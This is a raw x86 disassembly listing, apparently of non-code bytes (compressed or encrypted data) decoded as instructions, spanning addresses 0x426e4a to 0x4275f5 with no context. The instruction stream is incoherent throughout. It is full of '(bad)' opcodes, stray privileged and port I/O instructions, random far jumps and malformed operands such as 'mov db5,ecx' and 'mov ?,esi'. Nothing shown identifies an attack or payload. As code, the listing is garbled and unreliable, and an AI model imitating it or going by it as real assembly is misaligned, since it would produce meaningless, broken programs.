  426e4a:	or     esp,DWORD PTR [ebx+0x57]
  426e4d:	xor    BYTE PTR [bp+di+0x77a4],0x15
  426e53:	xor    al,0xf7
  426e55:	jmp    0xc300:0xed09f839
  426e5c:	sbb    eax,0xb12bb65b
  426e61:	ins    DWORD PTR es:[edi],dx
  426e62:	sbb    ah,dl
  426e64:	sub    eax,0x569dab1d
  426e69:	mov    edx,0x666faec5
  426e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e6f:	mov    WORD PTR [edi],ss
  426e71:	test   eax,0x40eea5d9
  426e76:	adc    BYTE PTR [eax-0x55026f38],dl
  426e7c:	sbb    cl,BYTE PTR [eax]
  426e7e:	xchg   esi,eax
  426e7f:	loopne 0x426ef3
  426e81:	inc    edx
  426e82:	aad    0x1a
  426e84:	lea    edi,[ebp-0x457821b9]
  426e8a:	scas   eax,DWORD PTR es:[edi]
  426e8b:	mov    ch,0xae
  426e8d:	fdivp  st(7),st
  426e8f:	imul   edx,DWORD PTR [ebx+0x62],0x1029e888
  426e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e97:	repnz xor al,0x9e
  426e9a:	xchg   ebx,eax
  426e9b:	test   eax,0x3df8e2cd
  426ea0:	dec    edi
  426ea1:	pop    ebx
  426ea2:	sahf   
  426ea3:	int    0x71
  426ea5:	in     eax,0xed
  426ea7:	iret   
  426ea8:	jmp    0xf87:0xdb9b9977
  426eaf:	loopne 0x426e35
  426eb1:	bound  ecx,QWORD PTR [eax+esi*2]
  426eb4:	enter  0x6498,0x3f
  426eb8:	test   al,0x30
  426eba:	and    al,0xe6
  426ebc:	mov    eax,ds:0xeaed2ae8
  426ec1:	adc    DWORD PTR [ecx+0x70],esi
  426ec4:	stc    
  426ec5:	or     DWORD PTR [edx+0x10abfbaf],esp
  426ecb:	sbb    dh,BYTE PTR [edi]
  426ecd:	arpl   WORD PTR [edi],dx
  426ecf:	fild   DWORD PTR [ecx-0x120057a5]
  426ed5:	mov    dh,0x76
  426ed7:	jnp    0x426f1d
  426ed9:	bound  edx,QWORD PTR [ebp+0x60]
  426edc:	mov    ds:0xab220b3b,al
  426ee1:	dec    ebx
  426ee2:	dec    edx
  426ee3:	enter  0x8497,0x11
  426ee7:	mov    DWORD PTR [ebp+0x44],ecx
  426eea:	pusha  
  426eeb:	popf   
  426eec:	push   ebx
  426eed:	std    
  426eee:	add    DWORD PTR [edx+0x52],edx
  426ef1:	rcr    BYTE PTR [esi],0x38
  426ef4:	pop    es
  426ef5:	mov    ebp,DWORD PTR [esi]
  426ef7:	add    ebp,edi
  426ef9:	mov    esi,0xba6da16d
  426efe:	mov    edx,0x213ea748
  426f03:	jle    0x426f30
  426f05:	lds    esi,FWORD PTR [ecx*2+0x59bd38e7]
  426f0c:	in     eax,dx
  426f0d:	mov    ds:0xb66b0b85,eax
  426f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f13:	pop    esp
  426f14:	inc    edx
  426f15:	dec    ebp
  426f16:	push   0x41
  426f18:	inc    esi
  426f19:	pusha  
  426f1a:	pxor   mm3,QWORD PTR [edi]
  426f1d:	test   BYTE PTR [edi],ch
  426f1f:	loope  0x426f17
  426f21:	jle    0x426f74
  426f23:	jae    0x426f52
  426f25:	test   BYTE PTR [ebx+edx*2+0x28],ah
  426f29:	mov    esp,0xa502c294
  426f2e:	lods   al,BYTE PTR ds:[esi]
  426f2f:	popa   
  426f30:	mov    ss,edx
  426f32:	push   ecx
  426f33:	or     eax,0x59f708d3
  426f38:	mov    al,0x5
  426f3a:	scas   al,BYTE PTR es:[edi]
  426f3b:	xchg   esi,eax
  426f3c:	sbb    eax,0xf93f38d4
  426f41:	and    al,0x56
  426f43:	jle    0x426f30
  426f45:	mov    DWORD PTR [ebx+0x1489a504],edx
  426f4b:	inc    ebx
  426f4c:	or     DWORD PTR [edi+0x35b07ba5],ebx
  426f52:	sbb    al,BYTE PTR [ecx-0x4f9d29fc]
  426f58:	inc    eax
  426f59:	hlt    
  426f5a:	icebp  
  426f5b:	or     DWORD PTR [ebx-0x7a],ebp
  426f5e:	daa    
  426f5f:	dec    ebx
  426f60:	rcr    BYTE PTR [esi+0x6ed3337f],1
  426f66:	les    ecx,FWORD PTR [edx+edx*8+0x47]
  426f6a:	mov    dl,0x53
  426f6c:	mov    ch,0x33
  426f6e:	sub    BYTE PTR [eax],ch
  426f70:	jmp    0x8ae4da92
  426f75:	(bad)  
  426f76:	outs   dx,BYTE PTR ds:[esi]
  426f77:	fdiv   QWORD PTR [ecx+ebx*1]
  426f7a:	ss gs push edx
  426f7d:	fild   QWORD PTR [esi-0x65f8153a]
  426f83:	mov    edx,0x623f91bc
  426f88:	dec    esi
  426f89:	(bad)  
  426f8b:	adc    DWORD PTR [esi],0x5c4b9182
  426f91:	ffree  st(2)
  426f93:	cld    
  426f94:	fisubr WORD PTR [ebx-0x31]
  426f97:	jae    0x426f4b
  426f99:	pop    edx
  426f9a:	or     bl,bl
  426f9c:	rcr    BYTE PTR [edi-0x61062899],1
  426fa2:	dec    esi
  426fa3:	es aam 0x3e
  426fa6:	fsub   DWORD PTR [eax+0x1d]
  426fa9:	xor    al,ah
  426fab:	ins    DWORD PTR es:[edi],dx
  426fac:	ss stos BYTE PTR es:[edi],al
  426fae:	(bad)  
  426fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fb1:	or     DWORD PTR [eax],edx
  426fb3:	aaa    
  426fb4:	aaa    
  426fb5:	mov    edi,0xbe71002d
  426fba:	out    dx,al
  426fbb:	sub    eax,0x998f7793
  426fc0:	dec    eax
  426fc1:	sub    cl,BYTE PTR [eax+0x22cad550]
  426fc7:	pop    esp
  426fc8:	mov    ebx,DWORD PTR [eax-0x7641785f]
  426fce:	push   esi
  426fcf:	inc    eax
  426fd0:	cld    
  426fd1:	push   eax
  426fd2:	daa    
  426fd3:	lds    edi,FWORD PTR cs:[ecx-0x3c]
  426fd7:	inc    esp
  426fd8:	cmp    al,0x70
  426fda:	retf   
  426fdb:	jne    0x426f72
  426fdd:	ja     0x42700c
  426fdf:	mov    edx,0xa9d0a05
  426fe4:	out    dx,eax
  426fe5:	mov    esi,DWORD PTR [eax-0x3e]
  426fe8:	jl     0x426f97
  426fea:	mov    DWORD PTR [esi+0x5399ebd4],eax
  426ff0:	jge    0x426ff0
  426ff2:	dec    ecx
  426ff3:	inc    edi
  426ff4:	(bad)  
  426ff5:	xor    dh,bl
  426ff7:	ficom  WORD PTR [ecx+0x1b]
  426ffa:	sub    al,0xc0
  426ffc:	out    0x6f,eax
  426ffe:	push   edx
  426fff:	(bad)  
  427000:	fadd   QWORD PTR [ebx-0x43]
  427003:	es inc ebx
  427005:	sub    DWORD PTR [edi+0x5276b965],esi
  42700b:	xchg   ebp,eax
  42700c:	sbb    eax,DWORD PTR [ebx]
  42700e:	sahf   
  42700f:	sub    ebx,esi
  427011:	push   edi
  427012:	pop    esp
  427013:	lods   al,BYTE PTR ds:[esi]
  427014:	dec    ecx
  427015:	pop    esi
  427016:	jo     0x427030
  427018:	pop    ds
  427019:	add    BYTE PTR [ecx+0x770d8691],al
  42701f:	int3   
  427020:	jbe    0x427024
  427022:	push   ss
  427023:	mov    edi,0x4e85656b
  427028:	add    dl,dl
  42702a:	or     al,0x1f
  42702c:	inc    ecx
  42702d:	jo     0x4270a3
	...
  427037:	add    BYTE PTR [eax],al
  427039:	add    dl,bh
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x7a5bc2eb]
  427047:	pop    eax
  427048:	cmp    al,0x24
  42704a:	jb     0x427032
  42704c:	add    DWORD PTR [eax],eax
  42704e:	std    
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    bl,cl
  427053:	fidiv  DWORD PTR [ebx+0x5f8d140e]
  427059:	arpl   WORD PTR [ebx],bp
  42705b:	xchg   DWORD PTR [eax],ecx
  42705d:	das    
  42705e:	leave  
  42705f:	lds    esi,FWORD PTR [ecx+eiz*2]
  427062:	xchg   ecx,eax
  427063:	scas   eax,DWORD PTR es:[edi]
  427064:	xor    al,0x4a
  427066:	mov    eax,ds:0x40980533
  42706b:	or     esp,edi
  42706d:	cmp    esp,DWORD PTR [esi]
  42706f:	addr16 cld 
  427071:	dec    esp
  427072:	xchg   esi,eax
  427073:	shl    BYTE PTR [ebx+0x7c],1
  427076:	mov    esp,0x6f63610b
  42707b:	shr    edx,cl
  42707d:	jg     0x4270da
  42707f:	and    ah,BYTE PTR [ecx]
  427081:	inc    edx
  427082:	shl    eax,0xd9
  427085:	cmp    eax,0x8cf02d1a
  42708a:	pushf  
  42708b:	or     cl,BYTE PTR [ecx]
  42708d:	ins    BYTE PTR es:[edi],dx
  42708e:	mov    bl,0x40
  427090:	jns    0x42710d
  427092:	jb     0x4270c4
  427094:	inc    esi
  427095:	xor    bl,BYTE PTR [edx+0x40b46469]
  42709b:	lods   al,BYTE PTR fs:[esi]
  42709d:	gs dec edi
  42709f:	pop    ss
  4270a0:	in     al,0x90
  4270a2:	mov    al,ds:0x4fd00826
  4270a7:	push   ecx
  4270a8:	mov    bh,0x8b
  4270aa:	xor    dl,ch
  4270ac:	(bad)  
  4270ad:	aad    0x7f
  4270af:	xchg   esp,eax
  4270b0:	or     esi,DWORD PTR [edx+0x4e1d8f08]
  4270b6:	rol    dl,cl
  4270b8:	repz es js 0x42706a
  4270bc:	add    eax,0xffe0776c
  4270c1:	push   edi
  4270c2:	inc    edx
  4270c3:	push   esp
  4270c4:	call   DWORD PTR [ecx+0x10]
  4270c7:	inc    esi
  4270c8:	pop    edi
  4270c9:	jne    0x42707c
  4270cb:	ins    BYTE PTR es:[edi],dx
  4270cc:	stos   DWORD PTR es:[edi],eax
  4270cd:	repnz outs dx,DWORD PTR ds:[esi]
  4270cf:	and    BYTE PTR [edx+0x6b],0xa7
  4270d3:	ret    0xda67
  4270d6:	cdq    
  4270d7:	outs   dx,DWORD PTR ds:[esi]
  4270d8:	fs pusha 
  4270da:	cmp    al,0x9a
  4270dc:	mov    dh,0x98
  4270de:	mov    al,ds:0xf17726d0
  4270e3:	clc    
  4270e4:	or     ax,0x2023
  4270e8:	mov    al,0x5d
  4270ea:	stos   BYTE PTR es:[edi],al
  4270eb:	scas   eax,DWORD PTR es:[edi]
  4270ec:	ins    DWORD PTR es:[edi],dx
  4270ed:	popa   
  4270ee:	(bad)  
  4270ef:	in     al,0xa8
  4270f1:	into   
  4270f2:	jg     0x427106
  4270f4:	cmp    DWORD PTR [esp+ecx*1+0x7],eax
  4270f8:	popa   
  4270f9:	dec    esi
  4270fa:	scas   eax,DWORD PTR es:[edi]
  4270fb:	data16 into 
  4270fd:	test   eax,0xd6c4bffd
  427102:	mov    ss,ecx
  427104:	sar    ebx,0x7f
  427107:	dec    ebx
  427108:	add    eax,0x62a08bb
  42710d:	out    0xd8,al
  42710f:	jge    0x4270c7
  427111:	cmp    al,0x5d
  427113:	in     eax,dx
  427114:	fwait
  427115:	(bad)  
  427116:	dec    ebp
  427117:	jmp    0x147d:0x965f8919
  42711e:	call   0x708ec477
  427123:	(bad)  
  427124:	aas    
  427125:	xchg   DWORD PTR ss:[esi+ebx*1+0x38b1eaa9],esi
  42712d:	les    ebx,FWORD PTR [edx+0x5e1d25c8]
  427133:	(bad)  
  427134:	lods   eax,DWORD PTR ds:[esi]
  427135:	push   0xfffffffe
  427137:	sbb    ah,BYTE PTR [edi+0x17]
  42713a:	pop    ds
  42713b:	fnstenv [edx-0x6e]
  42713e:	or     BYTE PTR [ecx],dh
  427140:	or     dl,al
  427142:	dec    esi
  427143:	fld    TBYTE PTR [edx+edx*1+0x4eabd25d]
  42714a:	xor    BYTE PTR [edi+0x18],bl
  42714d:	adc    ah,BYTE PTR [ebx+0x62]
  427150:	pop    edx
  427151:	iret   
  427152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427153:	dec    edi
  427154:	push   eax
  427155:	test   eax,0x36255f64
  42715a:	dec    esp
  42715b:	mov    esi,0x82bac47f
  427160:	add    ebx,DWORD PTR [esi]
  427162:	mov    ebp,0x61c6814f
  427167:	xchg   esp,eax
  427168:	inc    ebp
  427169:	jno    0x427182
  42716b:	dec    edx
  42716c:	add    ebx,DWORD PTR [edx]
  42716e:	retf   
  42716f:	ja     0x427101
  427171:	popa   
  427172:	push   ecx
  427173:	dec    eax
  427174:	das    
  427175:	jno    0x427187
  427177:	cld    
  427178:	xor    BYTE PTR [edi+0x33],bl
  42717b:	cmp    dl,bl
  42717d:	dec    esi
  42717e:	xor    eax,DWORD PTR [ebx-0x77]
  427181:	outs   dx,DWORD PTR ds:[esi]
  427182:	ret    
  427183:	push   ds
  427184:	xlat   BYTE PTR ds:[ebx]
  427185:	ret    
  427186:	frstor [ebp-0x5893d8b4]
  42718c:	ins    DWORD PTR es:[edi],dx
  42718d:	jmp    0x427127
  42718f:	and    eax,0x7cae1750
  427194:	push   ds
  427195:	ret    
  427196:	xchg   BYTE PTR [edi+0x2d],bh
  427199:	arpl   WORD PTR [ebx-0x79],sp
  42719c:	push   esp
  42719d:	(bad)  
  42719e:	popf   
  42719f:	int    0x0
  4271a1:	xor    cl,bh
  4271a3:	xchg   esp,eax
  4271a4:	in     al,0x80
  4271a6:	iret   
  4271a7:	fmul   DWORD PTR [esi+0x731197a5]
  4271ad:	push   esi
  4271ae:	(bad)  
  4271af:	mov    ch,0x57
  4271b1:	xor    eax,0xe566ba8
  4271b6:	out    dx,eax
  4271b7:	fidiv  DWORD PTR [ecx+0x1869fb07]
  4271bd:	or     cl,0xc7
  4271c0:	sti    
  4271c1:	jle    0x42721b
  4271c3:	and    eax,0x9522a3c4
  4271c8:	das    
  4271c9:	dec    eax
  4271ca:	mov    ch,BYTE PTR [eax+ebx*8]
  4271cd:	cmp    al,dl
  4271cf:	outs   dx,BYTE PTR ds:[esi]
  4271d0:	test   al,0x38
  4271d2:	push   0xffffff8a
  4271d4:	addr16 shr cl,cl
  4271d7:	in     eax,dx
  4271d8:	cwde   
  4271d9:	mov    dl,0x88
  4271db:	out    0x51,eax
  4271dd:	ret    0x9a50
  4271e0:	mov    eax,ds:0x46331d44
  4271e5:	lock (bad) [eax-0x7e]
  4271e9:	jmp    0x427255
  4271eb:	fld    DWORD PTR [ebx-0x28]
  4271ee:	cmc    
  4271ef:	mov    dl,0xc2
  4271f1:	enter  0x94f1,0x87
  4271f5:	aaa    
  4271f6:	in     eax,dx
  4271f7:	les    esp,FWORD PTR [edi-0x6ac10609]
  4271fd:	repnz icebp 
  4271ff:	mov    ss,WORD PTR [edx+edx*1-0x6e2d5976]
  427206:	nop
  427207:	or     BYTE PTR [edx+0x14795da5],dl
  42720d:	gs push cs
  42720f:	loope  0x4271b5
  427211:	jmp    0x4271e8
  427213:	mov    al,0x46
  427215:	sar    BYTE PTR [ebp-0x71],cl
  427218:	dec    edx
  427219:	scas   al,BYTE PTR es:[edi]
  42721a:	dec    ebp
  42721b:	push   edi
  42721c:	xchg   edi,eax
  42721d:	loopne 0x42722b
  42721f:	(bad)  
  427221:	in     al,0x58
  427223:	push   ds
  427224:	push   es
  427225:	xor    eax,0x874cde2d
  42722a:	lea    ecx,[ecx]
  42722c:	stc    
  42722d:	pop    esi
  42722e:	dec    ebp
  42722f:	pop    es
  427230:	xchg   edi,eax
  427231:	mov    bh,BYTE PTR [edx+0xf2ebe35]
  427237:	(bad)  [ebx]
  427239:	jge    0x427274
  42723b:	pop    ds
  42723c:	push   edi
  42723d:	ins    BYTE PTR es:[edi],dx
  42723e:	inc    eax
  42723f:	(bad)  
  427240:	jecxz  0x4271df
  427242:	and    DWORD PTR [ecx+0x68],eax
  427245:	xchg   esp,eax
  427246:	inc    ebx
  427247:	sub    DWORD PTR [ecx-0x783631d9],ecx
  42724d:	shr    BYTE PTR [edi+0x0],1
  427253:	add    BYTE PTR [eax],al
  427255:	add    BYTE PTR [eax],al
  427257:	add    BYTE PTR [eax],al
  427259:	add    bh,cl
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x5b02077
  427267:	clc    
  427268:	inc    esp
  427269:	inc    esp
  42726a:	outs   dx,DWORD PTR ds:[esi]
  42726b:	call   0x23f7271
  427270:	add    BYTE PTR [eax],al
  427272:	mov    ch,0x8f
  427274:	sahf   
  427275:	or     BYTE PTR [edx-0x3d88e0aa],al
  42727b:	pop    esi
  42727c:	push   sp
  42727e:	sub    al,0xe7
  427280:	daa    
  427281:	lahf   
  427282:	int3   
  427283:	inc    ebx
  427284:	sub    DWORD PTR [eax+esi*8+0x7a],0x3a2bcd4f
  42728c:	retf   0xf4b5
  42728f:	sbb    al,0xa6
  427291:	icebp  
  427292:	push   esi
  427293:	stos   BYTE PTR es:[edi],al
  427294:	loope  0x4272f9
  427296:	dec    esp
  427297:	mov    ds:0x9c761b8e,al
  42729c:	rol    DWORD PTR [esp+edi*4],1
  42729f:	jmp    0x1523:0xcb0a7362
  4272a6:	repz fild QWORD PTR fs:[esi-0x5a]
  4272ab:	leave  
  4272ac:	mov    al,ds:0xc723080f
  4272b1:	jmp    DWORD PTR [edx]
  4272b3:	xchg   ebp,eax
  4272b4:	shl    ah,1
  4272b6:	addr16 aam 0xc2
  4272b9:	sub    ebp,ebx
  4272bb:	es ja  0x42727a
  4272be:	add    eax,0xadf80480
  4272c3:	and    ch,BYTE PTR [esi-0x426b1863]
  4272c9:	sbb    eax,0x58f6a0f7
  4272ce:	dec    esi
  4272cf:	push   ecx
  4272d0:	aas    
  4272d1:	(bad)  
  4272d2:	push   eax
  4272d3:	lods   al,BYTE PTR ds:[esi]
  4272d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d5:	and    BYTE PTR [ebp+0x50],cl
  4272d8:	add    eax,0xb55ad494
  4272dd:	aam    0x96
  4272df:	push   cs
  4272e0:	and    ah,BYTE PTR [ecx-0x567237]
  4272e6:	out    dx,al
  4272e7:	hlt    
  4272e8:	ds nop
  4272ea:	add    bl,BYTE PTR [ecx]
  4272ec:	add    eax,0xc0e9bf03
  4272f1:	or     esp,DWORD PTR [esi]
  4272f3:	gs xchg esp,eax
  4272f5:	mov    edi,0x1a60291
  4272fa:	loop   0x4272fd
  4272fc:	pop    esp
  4272fd:	pop    ss
  4272fe:	mov    edx,0xeb0ca84a
  427303:	in     eax,dx
  427304:	or     ecx,edi
  427306:	push   es
  427307:	scas   eax,DWORD PTR es:[edi]
  427308:	fistp  QWORD PTR ss:[ebx+0x1e]
  42730c:	xor    cl,0x57
  42730f:	adc    al,0x2f
  427311:	jmp    0x5912:0x52f2315c
  427318:	aad    0xef
  42731a:	mov    dl,0x4c
  42731c:	lahf   
  42731d:	sub    al,0x39
  42731f:	in     eax,dx
  427320:	mov    edi,0x7a45b329
  427325:	fdiv   QWORD PTR [ebx]
  427327:	iret   
  427328:	mov    edx,0xd0567877
  42732d:	cmc    
  42732e:	das    
  42732f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427330:	sbb    DWORD PTR [ebx+0x196434f8],ebp
  427336:	pop    ds
  427337:	add    al,0x89
  427339:	push   ds
  42733a:	mov    ah,0x6b
  42733c:	js     0x427341
  42733e:	sub    ch,BYTE PTR [esi-0x1e]
  427341:	sbb    eax,0x53ff4a4f
  427346:	mov    ebp,0xca30c43a
  42734b:	pop    es
  42734c:	mov    al,0x6b
  42734e:	ret    0x9ca4
  427351:	sbb    eax,0x4cca87f5
  427356:	sbb    eax,0xfdb061df
  42735b:	xchg   ecx,eax
  42735c:	loope  0x4272f0
  42735e:	popa   
  42735f:	(bad)  
  427360:	lahf   
  427361:	aam    0x7d
  427363:	mov    ds:0x3ee8a06a,eax
  427368:	mov    cs,eax
  42736a:	mov    bl,0x8f
  42736c:	lods   eax,DWORD PTR ds:[esi]
  42736d:	push   esp
  42736e:	(bad)  
  42736f:	mov    dh,0x26
  427371:	stos   DWORD PTR es:[edi],eax
  427372:	sub    BYTE PTR ds:0xfcff58ad,dh
  427378:	xor    BYTE PTR fs:[edi+eiz*4+0x62],ah
  42737d:	xchg   ebp,eax
  42737e:	sbb    al,0xe4
  427380:	sub    edi,DWORD PTR [ebx-0x4b]
  427383:	mov    ecx,0xac45b6b2
  427388:	out    dx,eax
  427389:	stc    
  42738a:	test   DWORD PTR [ecx+0x10852824],esp
  427390:	cwde   
  427391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427392:	pushf  
  427393:	inc    edi
  427394:	adc    eax,0x11881e0e
  427399:	bound  esi,QWORD PTR [esi-0x71]
  42739c:	mov    bh,0x85
  42739e:	pushf  
  42739f:	rcr    ecx,0x66
  4273a2:	mov    bl,0x86
  4273a4:	imul   esi,DWORD PTR ds:0x7456d982,0x469d2f9d
  4273ae:	mov    ch,0x8e
  4273b0:	popf   
  4273b1:	repz es xor eax,0x42990e28
  4273b8:	or     eax,0x5713f5f0
  4273bd:	xchg   BYTE PTR [edi-0x74],bl
  4273c0:	repnz mov ecx,0x84122d16
  4273c6:	cwde   
  4273c7:	data16 mov ch,0x5
  4273ca:	add    eax,0xff24ce49
  4273cf:	cdq    
  4273d0:	ja     0x4273bf
  4273d2:	js     0x427374
  4273d4:	add    edx,DWORD PTR ds:0xd10ac642
  4273da:	dec    ebx
  4273db:	push   edi
  4273dc:	pusha  
  4273dd:	repnz mov ebp,0xf6420a02
  4273e3:	xchg   ecx,eax
  4273e4:	jecxz  0x4273eb
  4273e6:	or     esp,DWORD PTR [edx]
  4273e8:	and    DWORD PTR fs:[ebx+eiz*1],esi
  4273ec:	ins    BYTE PTR es:[edi],dx
  4273ed:	fldcw  WORD PTR [eax-0x72c9494b]
  4273f3:	aad    0x45
  4273f5:	pop    eax
  4273f6:	cdq    
  4273f7:	sub    BYTE PTR [ebp-0x4],0x80
  4273fb:	js     0x42737f
  4273fd:	aaa    
  4273fe:	sahf   
  4273ff:	pop    esi
  427400:	(bad)  
  427402:	aam    0xcc
  427404:	mov    db5,ecx
  427407:	xchg   esi,eax
  427408:	dec    ebx
  427409:	repz jmp DWORD PTR [ebx+0x3a370916]
  427410:	adc    cl,ah
  427412:	sub    DWORD PTR [edx+ebp*8-0x39],0xffffffab
  427417:	mov    edi,0xe1a4023
  42741c:	in     al,0x9f
  42741e:	adc    BYTE PTR [ebx+0xa5abdf6],al
  427424:	pop    ss
  427425:	pop    eax
  427426:	into   
  427427:	stc    
  427428:	adc    DWORD PTR [ecx],edx
  42742a:	mov    eax,ds:0xa5e4f451
  42742f:	mov    ss,ecx
  427431:	xchg   ebx,eax
  427432:	dec    esi
  427433:	push   eax
  427434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427435:	rcl    BYTE PTR [esi],0x74
  427438:	(bad)  
  42743a:	icebp  
  42743b:	lods   al,BYTE PTR ds:[esi]
  42743c:	pop    ss
  42743d:	lahf   
  42743e:	dec    ebx
  42743f:	cmp    DWORD PTR [edx],0x1e
  427442:	loopne 0x4273d6
  427444:	push   cs
  427445:	and    eax,0x7abc120
  42744a:	ret    
  42744b:	mov    edx,0x4875aae3
  427450:	xchg   esp,eax
  427451:	pop    edi
  427452:	imul   eax,edi,0x32bd165a
  427458:	dec    ecx
  427459:	fadd   st,st(7)
  42745b:	sbb    al,0x1b
  42745d:	push   edx
  42745e:	test   eax,0x82a412e5
  427463:	mov    ?,esi
  427465:	retf   
  427466:	cmp    BYTE PTR [edi-0x4a83e47],dl
  42746c:	push   ds
  42746d:	cdq    
  42746e:	cmp    eax,DWORD PTR [eax]
	...
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	mov    dl,0x9f
  427488:	(bad)  
  427489:	push   ds
  42748a:	ins    BYTE PTR es:[edi],dx
  42748b:	jmp    0x0:0x1fd0001
  427492:	jae    0x4274ee
  427494:	fsincos 
  427496:	push   0x76
  427498:	mov    bl,0xe9
  42749a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42749b:	loop   0x4274ca
  42749d:	lods   eax,DWORD PTR ds:[esi]
  42749e:	sar    DWORD PTR [edx+0x3e],1
  4274a1:	mov    ah,0xad
  4274a3:	mov    bl,0xce
  4274a5:	popf   
  4274a6:	jmp    0x427494
  4274a8:	data16 cli 
  4274aa:	push   ds
  4274ab:	ror    DWORD PTR [ebp+0x1a1c13ec],0xc7
  4274b2:	inc    eax
  4274b3:	mov    WORD PTR [ecx+0x26],cs
  4274b6:	inc    ebx
  4274b7:	jg     0x4274f6
  4274b9:	push   edx
  4274ba:	pop    edi
  4274bb:	jle    0x4274d3
  4274bd:	fidivr WORD PTR [ebx]
  4274bf:	sbb    eax,0x8863ce59
  4274c4:	sub    ebx,esi
  4274c6:	add    ch,BYTE PTR ds:0xbad59b3b
  4274cc:	jns    0x427482
  4274ce:	push   esp
  4274cf:	xchg   ecx,eax
  4274d0:	pop    es
  4274d1:	mov    cs,WORD PTR [eax-0x15]
  4274d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274d5:	push   ss
  4274d6:	out    dx,al
  4274d7:	xchg   esi,eax
  4274d8:	and    ecx,DWORD PTR [ebx-0x79b84b99]
  4274de:	gs dec ebp
  4274e0:	push   esi
  4274e1:	(bad)  
  4274e2:	shl    BYTE PTR [edi],0xa
  4274e5:	mov    esp,0xca924bc0
  4274ea:	and    DWORD PTR [ebx],edx
  4274ec:	cmp    al,0xc0
  4274ee:	push   esi
  4274ef:	loop   0x4274e8
  4274f1:	stc    
  4274f2:	inc    ecx
  4274f3:	aas    
  4274f4:	sub    edi,ebx
  4274f6:	cmp    BYTE PTR [edx],dl
  4274f8:	dec    esi
  4274f9:	jg     0x4274fd
  4274fb:	aaa    
  4274fc:	out    0xb8,al
  4274fe:	inc    ebx
  4274ff:	mov    ecx,0xced8774c
  427504:	mov    ds:0x58a46f78,eax
  427509:	fidivr WORD PTR ds:0x67a93838
  42750f:	mov    WORD PTR [eax+0x763f13d7],es
  427515:	pop    ebx
  427516:	sub    eax,0x62a9a983
  42751b:	mov    bh,0x65
  42751d:	leave  
  42751e:	popa   
  42751f:	rdmsr  
  427521:	icebp  
  427522:	aas    
  427523:	(bad)  
  427524:	jecxz  0x427537
  427526:	test   DWORD PTR [ebx+0x67],0x33498073
  42752d:	sbb    al,0xa7
  42752f:	pusha  
  427530:	pop    ebx
  427531:	nop
  427532:	ins    BYTE PTR es:[edi],dx
  427533:	mov    ebp,0x2e0dcedb
  427538:	int    0xfd
  42753a:	xor    BYTE PTR [edx-0x32],dh
  42753d:	mov    al,BYTE PTR cs:[eax+0x5f]
  427541:	push   ss
  427542:	dec    ecx
  427543:	test   BYTE PTR [edi+eax*8+0x33],dl
  427547:	xlat   BYTE PTR ds:[ebx]
  427548:	shl    DWORD PTR [ebp-0x2eedbd58],1
  42754e:	push   edi
  42754f:	dec    ebp
  427550:	xor    DWORD PTR [ebp+ebx*1+0x62],edi
  427554:	dec    edi
  427555:	or     eax,0xf152dafc
  42755a:	aam    0xcc
  42755c:	nop
  42755d:	or     al,0xb9
  42755f:	hlt    
  427560:	gs dec ebp
  427562:	mov    dl,0xfe
  427564:	test   al,0x7b
  427566:	inc    esp
  427567:	scas   eax,DWORD PTR es:[edi]
  427568:	aad    0x7a
  42756a:	jbe    0x4275af
  42756c:	loope  0x427560
  42756e:	inc    edx
  42756f:	jecxz  0x4275aa
  427571:	push   ebx
  427572:	scas   al,BYTE PTR es:[edi]
  427573:	dec    eax
  427574:	in     al,0xd
  427576:	outs   dx,BYTE PTR ds:[esi]
  427577:	outs   dx,BYTE PTR ds:[esi]
  427578:	xor    al,0x22
  42757a:	ret    
  42757b:	lahf   
  42757c:	cmp    eax,0x2cdba812
  427581:	int    0xb5
  427583:	fsubr  QWORD PTR [ebp-0xe8740a1]
  427589:	jo     0x42758e
  42758b:	sbb    BYTE PTR [edx],ch
  42758d:	push   ebx
  42758e:	ret    
  42758f:	and    ebp,esi
  427591:	fst    st(6)
  427593:	sbb    BYTE PTR [esp+edx*1-0x3b],bl
  427597:	mov    ah,0x9a
  427599:	retf   
  42759a:	jp     0x4275ba
  42759c:	es out 0x83,al
  42759f:	cmp    al,0x74
  4275a1:	jmp    0x45b1:0x315a4b2d
  4275a8:	mov    eax,0xc811a97
  4275ad:	(bad)  
  4275ae:	xchg   esi,eax
  4275af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275b0:	push   edx
  4275b1:	cld    
  4275b2:	stc    
  4275b3:	jecxz  0x4275a0
  4275b5:	jmp    0x4275de
  4275b7:	fdivr  st,st(2)
  4275b9:	lds    edi,FWORD PTR [ebx]
  4275bb:	mov    esp,0xf14f3c6
  4275c0:	sbb    bh,al
  4275c2:	iret   
  4275c3:	xchg   DWORD PTR [esi],edx
  4275c5:	fs inc ebx
  4275c7:	rol    edx,cl
  4275c9:	push   esi
  4275ca:	and    al,0xbb
  4275cc:	pop    eax
  4275cd:	sbb    BYTE PTR [ecx+0x3a403daf],bh
  4275d3:	pushf  
  4275d4:	cmp    DWORD PTR [edx],0x29b50a
  4275da:	add    al,0x26
  4275dc:	sub    ah,BYTE PTR [eax-0x3a]
  4275df:	mov    ds:0xaf177b69,eax
  4275e4:	jnp    0x42757b
  4275e6:	sbb    eax,0xe0c317b4
  4275eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275ec:	repz mov bl,0xee
  4275ef:	mov    eax,0xfe741af4
  4275f4:	(bad)  
  4275f5:	cmp    DWORD PTR [eax+0x2b],ebp
